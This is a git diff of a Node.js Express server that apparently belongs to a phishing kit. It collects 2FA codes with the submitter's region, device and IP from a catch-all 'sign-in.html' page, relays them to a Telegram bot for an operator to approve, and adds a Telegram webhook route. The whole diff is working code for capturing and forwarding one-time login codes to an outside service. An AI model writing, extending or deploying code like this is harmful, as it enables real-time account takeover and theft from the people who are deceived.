@@ -2,7 +2,7 @@ require('dotenv').config();
 const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors');
-const { sendTelegram2FARequest, setApprovalStatus, getApprovalStatus } = require('./bot');
+const { sendTelegram2FARequest, setApprovalStatus, getApprovalStatus, bot } = require('./bot');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
 
@@ -13,14 +13,18 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static(path.join(__dirname, '../public')));
 
+// Telegram webhook endpoint
+app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
+  bot.processUpdate(req.body);
+  res.sendStatus(200);
+});
+
 // API to submit 2FA code
 app.post('/api/submit-2fa', async (req, res) => {
   const { code, region, device, ip } = req.body;
   const requestId = uuidv4();
 
   setApprovalStatus(requestId, 'pending');
-
-  // Send to Telegram with inline buttons
   await sendTelegram2FARequest({ code, region, device, ip, requestId });
 
   res.json({ status: 'pending', requestId });
@@ -32,7 +36,7 @@ app.get('/api/approval-status/:requestId', (req, res) => {
   res.json({ status });
 });
 
-// Serve frontend (optional, if you want to serve HTML from backend)
+// Serve frontend (if you want to serve HTML from backend)
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, '../public/sign-in.html'));
 });
